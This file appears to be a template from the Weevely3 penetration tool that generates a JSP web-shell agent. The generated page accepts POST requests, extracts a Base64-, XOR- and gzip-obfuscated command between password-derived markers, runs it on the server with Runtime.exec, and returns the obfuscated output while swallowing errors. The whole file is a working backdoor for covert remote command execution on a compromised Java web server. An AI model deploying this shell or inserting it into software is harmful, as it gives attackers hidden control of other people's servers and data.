<%! import hashlib, weevely, string %>
<%
passwordhash = hashlib.md5(password.encode('utf-8')).hexdigest().lower()
key = passwordhash[:8]
header = passwordhash[8:20]
footer = passwordhash[20:32]
PREPEND = weevely.utils.strings.randstr(16, charset = string.digits + string.ascii_letters).decode('utf-8')
%>
<%text><%@ page import="java.util.*,java.io.*,java.util.zip.*" %></%text>
<%text><%</%text>
    // Weevely3 JSP Agent
    // Implements XOR -> GZIP -> Base64 protocol

    String k = "${key}";
    String kh = "${header}";
    String kf = "${footer}";
    String p = "${PREPEND}";

    if (request.getMethod().equals("POST")) {
        try {
            // Read raw body
            StringBuilder sb = new StringBuilder();
            BufferedReader reader = request.getReader();
            String line;
            while ((line = reader.readLine()) != null) {
                sb.append(line);
            }
            String content = sb.toString();

            int start = content.indexOf(kh);
            int end = content.indexOf(kf);

            if (start != -1 && end != -1) {
                String payload = content.substring(start + kh.length(), end);

                // Decode: Base64 -> XOR -> Gunzip
                byte[] decodedBytes = java.util.Base64.getDecoder().decode(payload);
                String xorred = new String(decodedBytes, "ISO-8859-1");
                
                StringBuilder unxorred = new StringBuilder();
                for (int i = 0; i < xorred.length(); i++) {
                    unxorred.append((char)(xorred.charAt(i) ^ k.charAt(i % k.length())));
                }

                ByteArrayInputStream bais = new ByteArrayInputStream(unxorred.toString().getBytes("ISO-8859-1"));
                GZIPInputStream gzis = new GZIPInputStream(bais);
                InputStreamReader isr = new InputStreamReader(gzis, "ISO-8859-1");
                BufferedReader br = new BufferedReader(isr);
                
                StringBuilder cmdSb = new StringBuilder();
                while ((line = br.readLine()) != null) {
                    cmdSb.append(line);
                }
                String cmd = cmdSb.toString();

                // Execute Command
                Process proc = Runtime.getRuntime().exec(cmd);
                InputStream stdin = proc.getInputStream();
                InputStream stderr = proc.getErrorStream();
                
                Scanner s = new Scanner(stdin).useDelimiter("\\A");
                String output = s.hasNext() ? s.next() : "";
                s = new Scanner(stderr).useDelimiter("\\A");
                output += s.hasNext() ? s.next() : "";

                // Encode: Gzip -> XOR -> Base64
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                GZIPOutputStream gzos = new GZIPOutputStream(baos);
                gzos.write(output.getBytes("ISO-8859-1"));
                gzos.close();
                
                String compressed = baos.toString("ISO-8859-1");
                StringBuilder reXorred = new StringBuilder();
                for (int i = 0; i < compressed.length(); i++) {
                    reXorred.append((char)(compressed.charAt(i) ^ k.charAt(i % k.length())));
                }
                
                String encoded = java.util.Base64.getEncoder().encodeToString(reXorred.toString().getBytes("ISO-8859-1"));

                out.print(p + kh + encoded + kf);
            }
        } catch (Exception e) {
            // out.print(e.toString());
        }
    }
<%text>%></%text>
